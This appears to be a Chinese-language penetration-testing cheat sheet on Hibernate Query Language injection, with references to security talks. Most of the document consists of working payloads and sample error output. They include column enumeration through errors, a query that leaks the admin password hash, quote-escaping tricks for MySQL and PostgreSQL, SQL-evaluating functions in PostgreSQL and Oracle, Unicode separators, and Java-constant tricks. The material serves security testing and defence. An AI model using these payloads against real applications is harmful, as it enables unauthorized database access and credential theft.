# Hibernate查询语言注入

> Hibernate ORM（简称Hibernate）是Java编程语言的对象关系映射工具。它为将面向对象的领域模型映射到关系数据库提供了一个框架。- 维基百科

## 摘要

* [HQL注释](#hql-comments)
* [HQL列出列](#hql-list-columns)
* [基于错误的HQL](#hql-error-based)
* [单引号转义](#single-quote-escaping)
* [$-引用的字符串](#--quoted-strings)
* [DBMS魔术函数](#dbms-magic-functions)
* [Unicode](#unicode)
* [Java常量](#java-constants)
* [按DBMS划分的方法](#methods-by-dbms)
* [参考资料](#references)

:warning: 您的输入将始终位于百分号符号之间：`%INJECT_HERE%`

## HQL注释

```sql
HQL不支持注释
```

## HQL列出列

```sql
from BlogPosts
where title like '%'
  and DOESNT_EXIST=1 and ''='%' -- 
  and published = true
```

使用不存在的列将引发异常并泄露多个列名。

```sql
org.hibernate.exception.SQLGrammarException: 列 "DOESNT_EXIST" 未找到；SQL语句：
      select blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159]
```

## 基于错误的HQL

```sql
from BlogPosts
where title like '%11'
  and (select password from User where username='admin')=1
  or ''='%'
  and published = true
```

基于值转换的错误。

```sql
数据转换错误，转换 "d41d8cd98f00b204e9800998ecf8427e"；SQL语句：
select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1
```

:warning: **HQL不支持UNION查询**

## 单引号转义

该方法适用于MySQL DBMS，在字符串中使用反斜杠`\`转义单引号。

在HQL中，通过两个单引号`''`来转义字符串中的单引号。

```
'abc\''or 1=(select 1)--'
```

在HQL中是字符串，在MySQL中是字符串和额外的SQL表达式。

## $-引用的字符串

该方法适用于允许在SQL表达式中使用美元引用字符串的DBMS：PostgreSQL、H2。

Hibernate ORM允许标识符以`$$`开头。

```
$$='$$=concat(chr(61),chr(39)) and 1=1--'
```

## DBMS魔术函数

该方法适用于具有评估字符串参数中SQL表达式的魔术函数的DBMS：PostgreSQL、Oracle。

Hibernate允许在HQL表达式中指定任何函数名称。

PostgreSQL有内置函数`query_to_xml('任意SQL')`。

```
array_upper(xpath('row',query_to_xml('select 1 where 1337>1', true, false,'')),1)
```

Oracle有内置函数`DBMS_XMLGEN.getxml('SQL')`

```
NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'
```

## Unicode

该方法适用于允许在SQL标记之间使用UNICODE分隔符（例如U+00A0）的DBMS：Microsoft SQL Server、H2。

在Microsoft SQL SERVER中`SELECT LEN([U+00A0](select[U+00A0](1)))`与`SELECT LEN((SELECT(1)))`的工作方式相同；

HQL允许在标识符（函数或参数名称）中使用UNICODE符号。

```
SELECT p FROM hqli.persistent.Post p where p.name='dummy' or 1<LEN( (select top 1 name from users)) or '1'='11'
```

## Java常量

该方法适用于大多数DBMS（MySQL除外）。

Hibernate在HQL查询中解析Java公共静态字段（Java常量）：

- 包含Java常量的类必须在类路径中
- 例如`java.lang.Character.SIZE`解析为16
- 字符串或字符常量另外用单引号括起来

要使用JAVA常量方法，我们需要在类路径上的类或接口中声明特殊字符或字符串字段。

```java
public class Constants {
    public static final String S_QUOTE = "'";
    public static final String HQL_PART = "select * from Post where name = '";
    public static final char C_QUOTE_1 = '\'';
    public static final char C_QUOTE_2 = '\047';
    public static final char C_QUOTE_3 = 39;
    public static final char C_QUOTE_4 = 0x27;
    public static final char C_QUOTE_5 = 047;
}
```

一些著名Java库中的可用常量：

```ps1
org.apache.batik.util.XMLConstants.XML_CHAR_APOS         [ Apache Batik ]
com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE           [ ICU4J ]
jodd.util.StringPool.SINGLE_QUOTE                        [ Jodd ]
ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR      [ Logback ]
cz.vutbr.web.csskit.OutputUtil.STRING_OPENING            [ jStyleParser ]
com.sun.java.help.impl.DocPConst.QUOTE                   [ JavaHelp ]
org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE  [ EclipseHelp ]
```

```
dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
```

## 按DBMS分类的方法

![image](https://user-images.githubusercontent.com/16578570/163428666-a22105a8-287c-4997-8aef-8f372a1b86e9.png)

## 参考资料

* [HQL for pentesters - 2014年2月12日 - Philippe Arteau](https://blog.h3xstream.com/2014/02/hql-for-pentesters.html)
* [如何在HQL（Hibernate查询语言）中添加注释？ - Thomas Bratt](https://stackoverflow.com/questions/3196975/how-to-put-a-comment-into-hql-hibernate-query-language)
* [HQL：疯狂查询语言 - 2015年4月6日 - Renaud Dubourguais](https://www.synacktiv.com/ressources/hql2sql_sstic_2015_en.pdf)
* [ORM2Pwn：利用Hibernate ORM中的注入 - 2015年11月26日 - Mikhail Egorov](https://www.slideshare.net/0ang3el/orm2pwn-exploiting-injections-in-hibernate-orm)
* [在Java应用程序中利用ORM注入的新方法 - HITBSecConf2016 - Mikhail Egorov - Sergey Soldatov](https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf)
* [在MySQL中利用HQL注入 - 2019年7月18日 - Olga Barinova](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/hql-injection-exploitation-in-mysql/)
